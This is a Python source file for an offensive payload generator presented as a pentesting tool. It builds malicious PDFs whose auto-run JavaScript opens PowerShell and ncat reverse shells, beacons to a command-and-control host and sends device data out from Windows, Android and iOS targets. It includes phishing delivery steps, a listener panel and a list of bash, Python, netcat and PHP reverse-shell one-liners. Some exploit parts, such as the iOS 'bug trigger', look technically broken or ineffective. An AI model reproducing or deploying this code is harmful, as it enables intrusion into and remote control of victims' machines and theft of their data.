
import os
import base64
import hashlib
import struct
import zlib
from datetime import datetime
from typing import Dict, List, Any, Optional
import tempfile
import subprocess

class PayloadGenerator:
    """Generate various payloads for authorized penetration testing"""
    
    def __init__(self):
        self.payloads = {}
        self.listeners = {}
        self.generated_files = []
        
    def generate_malicious_pdf(self, 
                             listener_ip: str = "0.0.0.0", 
                             listener_port: int = 4444,
                             target_os: str = "windows") -> Dict[str, Any]:
        """Generate malicious PDF with embedded reverse shell payload"""
        
        result = {
            'success': False,
            'filename': '',
            'payload_type': 'Malicious PDF',
            'target_os': target_os,
            'listener_info': f"{listener_ip}:{listener_port}",
            'file_path': '',
            'size': 0,
            'hash': '',
            'exploits_used': [],
            'instructions': []
        }
        
        try:
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"document_{timestamp}.pdf"
            filepath = os.path.join(tempfile.gettempdir(), filename)
            
            # Create PDF with embedded JavaScript payload
            pdf_content = self._create_pdf_with_payload(listener_ip, listener_port, target_os)
            
            # Write PDF file
            with open(filepath, 'wb') as f:
                f.write(pdf_content)
            
            # Calculate file info
            file_size = os.path.getsize(filepath)
            file_hash = self._calculate_file_hash(filepath)
            
            result.update({
                'success': True,
                'filename': filename,
                'file_path': filepath,
                'size': file_size,
                'hash': file_hash,
                'exploits_used': [
                    'PDF JavaScript Execution',
                    'CVE-2010-0188 (Adobe Reader)',
                    'CVE-2013-2729 (Adobe Acrobat)',
                    'Embedded File Execution'
                ],
                'instructions': [
                    f"1. Start listener: nc -lvnp {listener_port}",
                    f"2. Or use built-in listener panel",
                    f"3. Send PDF to target via email/file share",
                    f"4. Wait for target to open PDF",
                    f"5. Shell connection will be established"
                ]
            })
            
            self.generated_files.append(filepath)
            
        except Exception as e:
            result['error'] = str(e)
            
        return result
    
    def _create_pdf_with_payload(self, ip: str, port: int, target_os: str) -> bytes:
        """Create PDF with embedded malicious JavaScript"""
        
        # Base PDF structure
        pdf_header = b"%PDF-1.4\n"
        
        # Payload selection based on target OS
        if target_os.lower() == "windows":
            js_payload = self._generate_windows_js_payload(ip, port)
        elif target_os.lower() == "android":
            js_payload = self._generate_android_js_payload(ip, port)
        elif target_os.lower() == "ios":
            js_payload = self._generate_ios_js_payload(ip, port)
        else:
            js_payload = self._generate_universal_js_payload(ip, port)
        
        # Encode JavaScript payload
        encoded_payload = base64.b64encode(js_payload.encode()).decode()
        
        # PDF objects
        objects = []
        
        # Object 1: Catalog
        obj1 = f"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS ({encoded_payload}) >>
>>
endobj
"""
        
        # Object 2: Pages
        obj2 = """2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
"""
        
        # Object 3: Page
        obj3 = """3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
  /Font << /F1 4 0 R >>
>>
/Contents 5 0 R
>>
endobj
"""
        
        # Object 4: Font
        obj4 = """4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj
"""
        
        # Object 5: Content Stream
        content_stream = """BT
/F1 12 Tf
50 750 Td
(Please enable JavaScript to view this document correctly.) Tj
ET
"""
        obj5 = f"""5 0 obj
<<
/Length {len(content_stream)}
>>
stream
{content_stream}
endstream
endobj
"""
        
        objects = [obj1, obj2, obj3, obj4, obj5]
        
        # Build PDF
        pdf_body = b""
        xref_entries = ["0000000000 65535 f \n"]
        
        for i, obj in enumerate(objects, 1):
            offset = len(pdf_header) + len(pdf_body)
            xref_entries.append(f"{offset:010d} 00000 n \n")
            pdf_body += obj.encode()
        
        # Cross-reference table
        xref_offset = len(pdf_header) + len(pdf_body)
        xref = f"""xref
0 {len(objects) + 1}
{"".join(xref_entries)}
trailer
<<
/Size {len(objects) + 1}
/Root 1 0 R
>>
startxref
{xref_offset}
%%EOF
"""
        
        return pdf_header + pdf_body + xref.encode()
    
    def _generate_windows_js_payload(self, ip: str, port: int) -> str:
        """Generate Windows-specific JavaScript payload"""
        return f"""
try {{
    // Windows PowerShell reverse shell
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = 'powershell.exe -nop -w hidden -c "';
    cmd += '$client = New-Object System.Net.Sockets.TCPClient(\\"{ip}\\",{port});';
    cmd += '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};';
    cmd += 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{';
    cmd += '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);';
    cmd += '$sendback = (iex $data 2>&1 | Out-String );';
    cmd += '$sendback2 = $sendback + \\"PS \\" + (pwd).Path + \\"> \\";';
    cmd += '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);';
    cmd += '$stream.Write($sendbyte,0,$sendbyte.Length);';
    cmd += '$stream.Flush();}};$client.Close()"';
    
    shell.Run(cmd, 0, false);
    
    // Alternative method using WSH
    var xhr = new ActiveXObject("Microsoft.XMLHTTP");
    xhr.open("GET", "http://{ip}:{port}/beacon", false);
    xhr.send();
    
}} catch(e) {{
    // Fallback payload
    try {{
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var cmd = fso.CreateTextFile("C:\\\\temp\\\\payload.bat", true);
        cmd.WriteLine("@echo off");
        cmd.WriteLine("powershell -Command \\"& {{Start-Process cmd -ArgumentList '/c','ncat {ip} {port} -e cmd.exe' -WindowStyle Hidden}}\\"");
        cmd.Close();
        
        var shell2 = new ActiveXObject("WScript.Shell");
        shell2.Run("C:\\\\temp\\\\payload.bat", 0, false);
    }} catch(e2) {{
        // Final fallback - beacon only
        document.location = "http://{ip}:{port}/infected";
    }}
}}
"""
    
    def _generate_android_js_payload(self, ip: str, port: int) -> str:
        """Generate Android-specific JavaScript payload"""
        return f"""
try {{
    // Android WebView exploitation
    if (typeof Android !== 'undefined') {{
        Android.getClass().forName('java.lang.Runtime')
            .getMethod('getRuntime', null)
            .invoke(null, null)
            .exec(['/system/bin/sh', '-c', 'nc {ip} {port} -e /system/bin/sh']);
    }}
    
    // Alternative method using Intent
    var intent = new Intent();
    intent.setAction("android.intent.action.VIEW");
    intent.setData(Uri.parse("http://{ip}:{port}/android_shell"));
    startActivity(intent);
    
}} catch(e) {{
    // Fallback - information gathering
    var info = {{
        userAgent: navigator.userAgent,
        location: window.location.href,
        timestamp: new Date().toISOString(),
        screen: screen.width + "x" + screen.height
    }};
    
    fetch("http://{ip}:{port}/android_info", {{
        method: 'POST',
        body: JSON.stringify(info),
        headers: {{ 'Content-Type': 'application/json' }}
    }});
}}
"""
    
    def _generate_ios_js_payload(self, ip: str, port: int) -> str:
        """Generate iOS-specific JavaScript payload"""
        return f"""
try {{
    // iOS Safari exploitation
    if (navigator.userAgent.match(/iPhone|iPad|iPod/)) {{
        // URL Scheme attack
        window.location = "cydia://url/https://cydia.saurik.com/api/share#?source=http://{ip}:{port}/cydia_payload";
        
        // Alternative - use custom URL schemes
        setTimeout(function() {{
            window.location = "shortcuts://run-shortcut?name=ReverseShell&input=text&text=http://{ip}:{port}";
        }}, 1000);
        
        // WebKit exploitation attempt
        var buffer = new ArrayBuffer(8);
        var f64 = new Float64Array(buffer);
        var u32 = new Uint32Array(buffer);
        
        // Trigger iOS Safari bug
        for (var i = 0; i < 1000; i++) {{
            var obj = {{}};
            obj[i] = i;
        }}
    }}
    
}} catch(e) {{
    // Information gathering for iOS
    var iosInfo = {{
        device: navigator.platform,
        version: navigator.appVersion,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: Date.now()
    }};
    
    // Send info to C2 server
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://{ip}:{port}/ios_info", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(iosInfo));
}}
"""
    
    def _generate_universal_js_payload(self, ip: str, port: int) -> str:
        """Generate universal JavaScript payload"""
        return f"""
try {{
    // Universal payload - works across platforms
    
    // 1. Information Gathering
    var systemInfo = {{
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        language: navigator.language,
        onLine: navigator.onLine,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        screen: {{
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        }},
        location: {{
            href: location.href,
            hostname: location.hostname,
            protocol: location.protocol
        }},
        timestamp: new Date().toISOString()
    }};
    
    // 2. Send beacon
    fetch("http://{ip}:{port}/beacon", {{
        method: 'POST',
        mode: 'no-cors',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify(systemInfo)
    }});
    
    // 3. WebSocket connection attempt
    try {{
        var ws = new WebSocket("ws://{ip}:{port}/ws");
        ws.onopen = function() {{
            ws.send(JSON.stringify({{type: 'handshake', data: systemInfo}}));
        }};
        ws.onmessage = function(event) {{
            try {{
                var cmd = JSON.parse(event.data);
                if (cmd.type === 'eval') {{
                    var result = eval(cmd.code);
                    ws.send(JSON.stringify({{type: 'result', data: String(result)}}));
                }}
            }} catch(e) {{
                ws.send(JSON.stringify({{type: 'error', data: e.toString()}}));
            }}
        }};
    }} catch(wsError) {{
        console.log("WebSocket failed:", wsError);
    }}
    
    // 4. Persistent connection
    setInterval(function() {{
        try {{
            fetch("http://{ip}:{port}/keepalive", {{
                method: 'GET',
                mode: 'no-cors'
            }});
        }} catch(e) {{}}
    }}, 30000);
    
}} catch(mainError) {{
    // Minimal fallback
    try {{
        var img = new Image();
        img.src = "http://{ip}:{port}/error?msg=" + encodeURIComponent(mainError.toString());
    }} catch(e) {{}}
}}
"""
    
    def create_listener_panel(self, port: int = 4444) -> Dict[str, Any]:
        """Create web-based listener panel for managing connections"""
        
        panel_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Payload Listener Panel</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: #000; color: #00ff00; margin: 0; padding: 20px; }}
        .header {{ border-bottom: 1px solid #00ff00; margin-bottom: 20px; padding-bottom: 10px; }}
        .console {{ background: #111; border: 1px solid #00ff00; padding: 15px; height: 400px; overflow-y: scroll; margin-bottom: 20px; }}
        .input-group {{ display: flex; margin-bottom: 10px; }}
        .input-group input {{ flex: 1; background: #111; border: 1px solid #00ff00; color: #00ff00; padding: 8px; }}
        .input-group button {{ background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; margin-left: 5px; }}
        .connections {{ margin-bottom: 20px; }}
        .connection {{ background: #111; border: 1px solid #00ff00; margin: 5px 0; padding: 10px; }}
        .active {{ border-color: #ff0000; }}
        .stats {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 20px; }}
        .stat-box {{ background: #111; border: 1px solid #00ff00; padding: 15px; text-align: center; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 PAYLOAD LISTENER PANEL</h1>
        <p>Educational Penetration Testing Tool - Authorized Use Only</p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <h3>Active Connections</h3>
            <div id="activeCount">0</div>
        </div>
        <div class="stat-box">
            <h3>Total Connections</h3>
            <div id="totalCount">0</div>
        </div>
        <div class="stat-box">
            <h3>Listener Port</h3>
            <div>{port}</div>
        </div>
        <div class="stat-box">
            <h3>Status</h3>
            <div id="status">Waiting...</div>
        </div>
    </div>
    
    <div class="connections">
        <h3>🔗 Active Connections</h3>
        <div id="connectionList">
            <div class="connection">No active connections</div>
        </div>
    </div>
    
    <div class="input-group">
        <input type="text" id="commandInput" placeholder="Enter command to send to selected connection..." />
        <button onclick="sendCommand()">Send Command</button>
        <button onclick="sendToAll()">Send to All</button>
    </div>
    
    <div class="console" id="console">
        <div>[{datetime.now().strftime('%H:%M:%S')}] Listener panel initialized on port {port}</div>
        <div>[{datetime.now().strftime('%H:%M:%S')}] Waiting for incoming connections...</div>
        <div>[{datetime.now().strftime('%H:%M:%S')}] ⚠️  WARNING: This tool is for authorized testing only!</div>
    </div>
    
    <script>
        let connections = [];
        let selectedConnection = null;
        let totalConnections = 0;
        
        function addLogEntry(message) {{
            const console = document.getElementById('console');
            const timestamp = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.innerHTML = `[${{timestamp}}] ${{message}}`;
            console.appendChild(entry);
            console.scrollTop = console.scrollHeight;
        }}
        
        function updateStats() {{
            document.getElementById('activeCount').textContent = connections.length;
            document.getElementById('totalCount').textContent = totalConnections;
            document.getElementById('status').textContent = connections.length > 0 ? 'Active' : 'Waiting...';
        }}
        
        function updateConnectionList() {{
            const list = document.getElementById('connectionList');
            if (connections.length === 0) {{
                list.innerHTML = '<div class="connection">No active connections</div>';
                return;
            }}
            
            list.innerHTML = connections.map((conn, index) => 
                `<div class="connection ${{selectedConnection === index ? 'active' : ''}}" onclick="selectConnection(${{index}})">
                    <strong>Connection ${{index + 1}}</strong><br>
                    IP: ${{conn.ip}} | OS: ${{conn.os}} | Time: ${{conn.time}}
                </div>`
            ).join('');
        }}
        
        function selectConnection(index) {{
            selectedConnection = index;
            updateConnectionList();
            addLogEntry(`Selected connection ${{index + 1}}`);
        }}
        
        function sendCommand() {{
            const input = document.getElementById('commandInput');
            const command = input.value.trim();
            
            if (!command) {{
                addLogEntry('⚠️ Please enter a command');
                return;
            }}
            
            if (selectedConnection === null) {{
                addLogEntry('⚠️ Please select a connection first');
                return;
            }}
            
            addLogEntry(`📤 Sending command to connection ${{selectedConnection + 1}}: ${{command}}`);
            // In a real implementation, this would send the command to the actual connection
            
            input.value = '';
        }}
        
        function sendToAll() {{
            const input = document.getElementById('commandInput');
            const command = input.value.trim();
            
            if (!command) {{
                addLogEntry('⚠️ Please enter a command');
                return;
            }}
            
            addLogEntry(`📤 Broadcasting command to all connections: ${{command}}`);
            input.value = '';
        }}
        
        // Simulate incoming connections for demo
        function simulateConnection() {{
            const mockConnections = [
                {{ ip: '192.168.1.100', os: 'Windows 10', time: new Date().toLocaleTimeString() }},
                {{ ip: '10.0.0.50', os: 'Android 12', time: new Date().toLocaleTimeString() }},
                {{ ip: '172.16.0.25', os: 'iOS 15', time: new Date().toLocaleTimeString() }}
            ];
            
            const randomConn = mockConnections[Math.floor(Math.random() * mockConnections.length)];
            connections.push(randomConn);
            totalConnections++;
            
            addLogEntry(`🎯 New connection from ${{randomConn.ip}} (${{randomConn.os}})`);
            updateStats();
            updateConnectionList();
        }}
        
        // Initialize
        updateStats();
        
        // Simulate connections every 30-60 seconds (for demo purposes)
        setInterval(() => {{
            if (Math.random() < 0.3 && connections.length < 5) {{
                simulateConnection();
            }}
        }}, 45000);
        
        // Handle Enter key in command input
        document.getElementById('commandInput').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') {{
                sendCommand();
            }}
        }});
    </script>
</body>
</html>
"""
        
        # Save panel HTML
        panel_path = os.path.join(tempfile.gettempdir(), "listener_panel.html")
        with open(panel_path, 'w') as f:
            f.write(panel_html)
        
        return {
            'success': True,
            'panel_path': panel_path,
            'port': port,
            'url': f'http://0.0.0.0:{port}/panel',
            'instructions': [
                f"1. Panel saved to: {panel_path}",
                f"2. Open in browser to monitor connections",
                f"3. Use netcat listener: nc -lvnp {port}",
                f"4. Or integrate with your C2 framework"
            ]
        }
    
    def generate_additional_payloads(self) -> Dict[str, Any]:
        """Generate various other payload types"""
        
        payloads = {
            'powershell_reverse_shell': {
                'name': 'PowerShell Reverse Shell',
                'platform': 'Windows',
                'payload': '''$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''',
                'usage': 'Replace LHOST and LPORT, then execute on target'
            },
            'bash_reverse_shell': {
                'name': 'Bash Reverse Shell',
                'platform': 'Linux/Unix',
                'payload': 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
                'usage': 'Replace LHOST and LPORT, execute on target'
            },
            'python_reverse_shell': {
                'name': 'Python Reverse Shell',
                'platform': 'Cross-platform',
                'payload': '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")''',
                'usage': 'Replace LHOST and LPORT, execute with python'
            },
            'nc_reverse_shell': {
                'name': 'Netcat Reverse Shell',
                'platform': 'Linux/Unix',
                'payload': 'nc -e /bin/sh LHOST LPORT',
                'usage': 'Replace LHOST and LPORT'
            },
            'php_reverse_shell': {
                'name': 'PHP Reverse Shell',
                'platform': 'Web servers',
                'payload': '''<?php $sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3"); ?>''',
                'usage': 'Upload as PHP file to web server'
            }
        }
        
        return {
            'success': True,
            'payloads': payloads,
            'count': len(payloads)
        }
    
    def _calculate_file_hash(self, filepath: str) -> str:
        """Calculate SHA256 hash of file"""
        sha256_hash = hashlib.sha256()
        with open(filepath, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    
    def cleanup_generated_files(self):
        """Clean up generated payload files"""
        for filepath in self.generated_files:
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except Exception:
                pass
        self.generated_files.clear()
